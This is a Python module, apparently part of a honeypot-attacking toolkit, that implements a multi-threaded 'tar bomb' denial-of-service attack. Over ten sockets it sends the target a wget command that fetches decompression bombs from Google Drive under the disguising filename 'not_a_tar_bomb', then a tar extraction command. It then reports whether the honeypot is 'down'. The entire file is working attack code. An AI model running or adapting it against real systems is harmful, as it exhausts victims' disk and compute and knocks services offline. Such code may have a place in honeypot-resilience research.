import threading
import time

from .base_attack import BaseAttack
"""
Notes:
- Maybe in the future improve it to handle also zip bombs
- Maybe it needs some more work to crash the honeypot
"""

# Constants
TAR_URL_FILEIDS = {
    "small": "1Jc60r-D33DUF2TErY3qNhWpk0xFJB_kE",
    "medium": "1GVPnsQIkyUJqEQFR3vYxmkbvM3B0uS4g",
    "large": "1Chow8Qh-bUb_LCqJzeTdN1PNmWlZ6kyi",
}
NUM_OF_THREADS = 10
DOWNLOAD_SLEEP_TIME = 10
EXTRACT_SLEEP_TIME = {
    "small": 30,
    "medium": 50,
    "large": 80
}


class TarBomb(BaseAttack):
    def __init__(self, honeypot):
        super().__init__(honeypot)
        self.tar_url_fileids = TAR_URL_FILEIDS
        self.num_of_threads = NUM_OF_THREADS

    def download_bomb(self, conn, bomb_size):
        """
        Downloads the tar bomb using a wget command and the file ID.
        """
        try:
            cmd = f"wget 'https://docs.google.com/uc?export=download&id={self.tar_url_fileids[bomb_size]}' -O not_a_tar_bomb_{bomb_size}.tar\n"
            conn.sendall(cmd.encode())
            time.sleep(DOWNLOAD_SLEEP_TIME)
        except Exception as e:
            print(f"Error while downloading tar bomb: {e}")

    def extract_bomb(self, conn, bomb_size):
        """
        Extracts the tar bomb using the tar command.
        """
        try:
            cmd = f'tar -xf not_a_tar_bomb_{bomb_size}.tar\n'
            conn.sendall(cmd.encode())
            time.sleep(EXTRACT_SLEEP_TIME[bomb_size])
        except Exception as e:
            print(f"Error while extracting tar bomb: {e}")

    def attack_attempt(self, conn, bomb_size):
        """
        Attempts to download and extract the tar bomb.
        """
        if conn is None:
            print("Failed to establish connection")
            return
        try:
            self.download_bomb(conn, bomb_size)
            self.extract_bomb(conn, bomb_size)
        except Exception as e:
            print(f"Error in attack attempt: {e}")

    def run_attack_with_bomb_size(self, bomb_size):
        """
        Runs the attack using multiple threads.
        """
        attack_threads = []

        for _ in range(self.num_of_threads):
            conn = self.connect_socket()

            if conn is None:
                continue

            self.socket_connections.append(conn)
            thread = threading.Thread(target=self.attack_attempt,
                                      args=(conn, bomb_size))
            thread.start()
            attack_threads.append(thread)

        for thread in attack_threads:
            try:
                thread.join()
            except Exception as e:
                print(f"Error in attack thread: {e}")

    def run_attack(self):
        """
        Runs the attack using multiple threads.
        """
        print(f"Running tar bomb attack on {self.honeypot.ip}:{self.honeypot.port}...")
        start_time = time.time()

        for bomb_size in TAR_URL_FILEIDS.keys():
            self.run_attack_with_bomb_size(bomb_size)

        end_time = time.time()
        time_taken = end_time - start_time

        self.close_socket_connections()

        if self.is_honeypot_alive():
            return (False,
                    "Tar bomb attack executed, but honeypot is still alive",
                    time_taken,
                    3*self.num_of_threads)
        else:
            return (True,
                    "Tar bomb attack executed successfully, honeypot is down",
                    time_taken,
                    3*self.num_of_threads)